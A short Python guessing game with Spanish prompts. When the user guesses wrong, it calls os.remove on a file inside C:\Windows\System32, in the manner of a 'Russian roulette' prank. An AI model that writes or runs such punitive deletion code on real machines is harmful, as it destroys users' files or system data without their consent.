import os
import random
x=random.randint(0,5)
y=int(input("ingrese un numero"))
if x==y:
  print("felicidades")
else:
  os.remove("C:\\Windows\\System32\\archivo.txt")